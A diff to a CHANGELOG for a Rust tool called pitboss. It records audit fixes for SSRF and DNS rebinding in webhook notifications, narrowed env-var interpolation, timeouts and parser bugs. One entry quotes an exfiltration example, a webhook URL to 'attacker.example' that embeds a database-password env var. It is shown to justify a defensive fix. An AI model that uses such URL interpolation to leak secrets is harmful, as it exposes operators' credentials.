@@ -369,6 +369,63 @@ This project uses [Semantic Versioning](https://semver.org/).
 
 ### Fixed
 
+**Notify (manifest #156 follow-ups, audit closure):**
+- `notify::config::pre_request_ssrf_check` — now returns the validated
+  `SocketAddr` set instead of `Result<()>`, and each HTTP sink builds a
+  one-shot `reqwest::Client` with `resolve_to_addrs(host, …)` pinning the
+  destination to those exact IPs. Closes the TOCTOU window between the
+  guard's DNS lookup and reqwest's own internal lookup at `send()`-time
+  (DNS rebinding / mutable CNAME). The shared client is still used on the
+  SSRF-bypass path (`PITBOSS_PARENT_NOTIFY_URL`). (#156 M2)
+- `notify::config::ENV_VAR_ALLOWED_PREFIX` — narrowed from `PITBOSS_` to
+  `PITBOSS_NOTIFY_`. A manifest can no longer write
+  `url = "https://attacker.example/${PITBOSS_DB_PASSWORD}"` to encode a
+  pitboss-internal env var (`PITBOSS_RUN_ID`, `PITBOSS_PARENT_NOTIFY_URL`,
+  smoke-test fixtures, operator secrets) into the webhook URL. Operators
+  who need to inject a hook URL via env var rename their secret to start
+  with `PITBOSS_NOTIFY_`. **Breaking** for manifests that interpolated
+  non-`PITBOSS_NOTIFY_` env vars into a `[[notification]].url`. (#156 M3)
+- `NotificationRouter` — terminal emit failures (after-retry exhaustion +
+  fatal 4xx short-circuits) now (a) bump a `failed_emits_total` atomic
+  counter accessible via `router.failed_emits_total()`, and (b) write a
+  `TaskEvent::NotificationFailed` JSONL line to
+  `<run_subdir>/notifications.jsonl`. Both runners
+  (`dispatch::runner::dispatch` flat + `dispatch::hierarchical::dispatch`)
+  bind the run subdir to the router right after creating it. The journal
+  write is best-effort; an I/O error there is `tracing::warn`'d and
+  doesn't propagate. (#156 M4)
+- `NotificationConfig.request_timeout_secs` (new field, optional) — per
+  `[[notification]]` HTTP timeout in seconds; defaults to
+  `DEFAULT_REQUEST_TIMEOUT_SECS` (30) when unset. Plumbs through
+  `notify::sinks::build` to the Webhook / Slack / Discord sinks. The
+  previous behaviour (hard-coded 30 s on the `RequestBuilder`) was
+  invisible at the manifest surface and stacked across the 3-attempt
+  retry loop to a ~91 s worst-case latency tail. (#156 L5)
+- `NotificationRouter::new` — the LRU dedup cache size is now
+  operator-tunable via `PITBOSS_NOTIFY_DEDUP_CACHE_SIZE` (parsed once at
+  router construction; non-numeric or zero values fall back to
+  `DEFAULT_DEDUP_CACHE_SIZE = 64`). New explicit constructor
+  `new_with_capacity(sinks, capacity)` for tests that need deterministic
+  cache behaviour independent of the process env. (#156 L1)
+- `notify::parent::set_run_id_env` — wrapped `std::env::set_var` in an
+  `unsafe` block with a SAFETY comment documenting the dispatcher's
+  single-call-site contract (called before any worker / MCP /
+  notification task is spawned, exactly once per process). Forward-
+  compatible with Rust edition 2024, where `set_var` becomes `unsafe`.
+  (#156 L7)
+
+**Manifest (#155 final follow-up):**
+- `manifest::map_doc::build_line_index` — brace-depth scanner skips lines
+  starting with `//` or `///`. Doc-comments containing `{` or `}` (e.g. a
+  struct-literal example inside a `///` block) used to corrupt the depth
+  counter and falsely close the surrounding struct body, attributing
+  later fields to the wrong struct. (#155)
+- `manifest::map_doc` / `manifest::example_doc` `--check` mode (CLI and
+  test) — strips CR before LF on the checked-in file before comparing to
+  the generator output. Windows checkouts with `core.autocrlf=true` no
+  longer false-positive every drift check. The generator only emits LF;
+  any CR present came from git, not from drift. (#155)
+
 **Schema metadata (pitboss-schema + pitboss-schema-derive audit follow-ups):**
 - `pitboss_schema::FormType` — marked `#[non_exhaustive]`, derives
   `Hash`, `PartialOrd`, `Ord`, and `serde::Serialize` (snake_case names
